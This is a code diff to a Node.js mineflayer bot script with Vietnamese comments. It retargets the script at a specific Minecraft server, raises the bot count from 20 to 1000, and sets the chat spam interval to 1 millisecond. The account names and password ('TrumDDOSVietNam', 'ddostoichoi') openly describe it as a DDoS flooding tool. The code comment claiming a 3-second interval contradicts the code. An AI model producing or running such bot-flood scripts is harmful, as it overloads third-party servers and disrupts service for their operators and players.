@@ -1,14 +1,14 @@
 const mineflayer = require('mineflayer')
 
 // Cấu hình địa chỉ server của bạn
-const SERVER_ADDR = 'Legendsmp.site:26009';
+const SERVER_ADDR = 'stratos.pikamc.vn:26487';
 
 const CONFIG = {
     host: SERVER_ADDR.split(':')[0], 
     port: parseInt(SERVER_ADDR.split(':')[1]) || 25565,
-    botCount: 20,
-    prefix: 'BigZOnTop',
-    password: '20116789', // Mật khẩu dùng cho cả Register và Login
+    botCount: 1000,
+    prefix: 'TrumDDOSVietNam',
+    password: 'ddostoichoi', // Mật khẩu dùng cho cả Register và Login
     version: "1.21.4" 
 }
 
@@ -38,7 +38,7 @@ function createBot(id) {
         setTimeout(() => {
             if (!bot.spamInterval) {
                 bot.spamInterval = setInterval(() => {
-                    bot.chat('BigZ On Top!')
+                    bot.chat('DDOS On Top!')
                 }, 1) // Nhắn mỗi 3 giây để tránh bị kick quá nhanh
             }
         }, 1)
